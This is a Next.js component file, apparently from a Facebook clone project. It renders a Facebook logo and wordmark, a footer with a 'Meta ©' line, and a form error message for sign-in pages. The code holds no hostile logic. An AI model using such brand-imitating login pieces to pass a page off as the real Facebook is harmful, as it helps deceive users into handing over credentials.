import Image from 'next/image'
import Link from 'next/link'

const FOOTER_LINKS = ['Privacy', 'Terms', 'Advertising', 'Cookies', 'More']
const LANGUAGES = ['English', 'Filipino', 'Español', 'Français', 'Deutsch', 'Italiano', 'Português']

export const AuthLogo = ({ size = 'md' }) => {
    const sizes = { sm: { img: 36, text: 'text-3xl' }, md: { img: 48, text: 'text-4xl' }, lg: { img: 60, text: 'text-5xl' } }
    const s = sizes[size]
    return (
        <div className="flex items-center gap-2">
            <Image src="/images/facebook-logo.jpg" alt="Facebook" width={s.img} height={s.img} className="rounded-full" />
            <span className={`text-[#1877f2] ${s.text} font-bold tracking-tight`}>facebook</span>
        </div>
    )
}

export const AuthFooter = ({ showLanguages = false }) => (
    <footer className="mt-8 text-center text-xs text-gray-500 max-w-2xl">
        {showLanguages && (
            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 mb-2">
                {LANGUAGES.map(lang => (
                    <button key={lang} className="hover:underline">{lang}</button>
                ))}
            </div>
        )}
        <hr className="border-gray-200 mb-2" />
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1">
            {FOOTER_LINKS.map(link => (
                <Link key={link} href="#" className="hover:underline">{link}</Link>
            ))}
            <span>Meta © {new Date().getFullYear()}</span>
        </div>
    </footer>
)

export const FieldError = ({ message }) =>
    message ? <p className="text-red-500 text-xs mt-1">{message}</p> : null
